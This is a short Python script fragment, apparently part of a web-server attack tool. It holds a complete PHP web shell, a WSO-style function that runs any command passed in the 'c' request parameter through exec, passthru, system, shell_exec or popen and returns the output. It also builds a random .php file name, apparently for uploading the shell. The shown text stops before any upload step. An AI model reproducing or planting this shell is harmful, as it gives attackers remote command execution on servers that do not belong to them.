#!/usr/bin/python
import random
import string

PHP_EXEC = '<?php function wsoEx($in){$out = "";if (function_exists("exec")){@exec($in,$out);$out = @join("\n",$out);}elseif (function_exists("passthru")){ob_start();@passthru($in);$out = ob_get_clean();}elseif (function_exists("system")){ob_start();@system($in);$out = ob_get_clean();}elseif (function_exists("shell_exec")){$out = shell_exec($in);}elseif (is_resource($f = @popen($in,"r"))){$out = "";while(!@feof($f)) $out .= fread($f,1024);pclose($f);}return $out;} echo "<cmd>".wsoEX($_REQUEST[c])."</cmd>"; ?>'
SHELL_NAME = ''.join(random.sample(string.lowercase+string.digits,12))
SHELL_EXT = SHELL_NAME+".php"